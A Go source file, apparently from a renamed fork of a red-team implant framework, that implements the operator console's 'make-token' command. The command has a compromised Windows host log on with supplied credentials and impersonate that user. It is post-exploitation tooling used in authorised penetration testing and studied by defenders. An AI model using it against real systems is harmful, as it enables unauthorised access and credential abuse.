package privilege

/*
	Revils Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"

	"github.com/Kevin-kitnick/revils/client/console"
	"github.com/Kevin-kitnick/revils/protobuf/clientpb"
	"github.com/Kevin-kitnick/revils/protobuf/revilspb"
	"github.com/desertbit/grumble"
	"google.golang.org/protobuf/proto"
)

var logonTypes = map[string]uint32{
	"LOGON_INTERACTIVE":       2,
	"LOGON_NETWORK":           3,
	"LOGON_BATCH":             4,
	"LOGON_SERVICE":           5,
	"LOGON_UNLOCK":            7,
	"LOGON_NETWORK_CLEARTEXT": 8,
	"LOGON_NEW_CREDENTIALS":   9,
}

// MakeTokenCmd - Windows only, create a token using "valid" credentails
func MakeTokenCmd(ctx *grumble.Context, con *console.RevilsConsoleClient) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	username := ctx.Flags.String("username")
	password := ctx.Flags.String("password")
	domain := ctx.Flags.String("domain")
	logonType := ctx.Flags.String("logon-type")

	if _, ok := logonTypes[logonType]; !ok {
		con.PrintErrorf("Invalid logon type: %s\n", logonType)
		return
	}

	if username == "" || password == "" {
		con.PrintErrorf("Pou must provide a username and password\n")
		return
	}

	ctrl := make(chan bool)
	con.SpinUntil("Creating new logon session ...", ctrl)

	makeToken, err := con.Rpc.MakeToken(context.Background(), &revilspb.MakeTokenReq{
		Request:   con.ActiveTarget.Request(ctx),
		Username:  username,
		Domain:    domain,
		Password:  password,
		LogonType: logonTypes[logonType],
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	if makeToken.Response != nil && makeToken.Response.Async {
		con.AddBeaconCallback(makeToken.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, makeToken)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintMakeToken(makeToken, domain, username, con)
		})
		con.PrintAsyncResponse(makeToken.Response)
	} else {
		PrintMakeToken(makeToken, domain, username, con)
	}
}

// PrintMakeToken - Print the results of attempting to make a token
func PrintMakeToken(makeToken *revilspb.MakeToken, domain string, username string, con *console.RevilsConsoleClient) {
	if makeToken.Response != nil && makeToken.Response.GetErr() != "" {
		con.PrintErrorf("%s\n", makeToken.Response.GetErr())
		return
	}
	con.Println()
	con.PrintInfof("Successfully impersonated %s\\%s. Use `rev2self` to revert to your previous token.", domain, username)
}
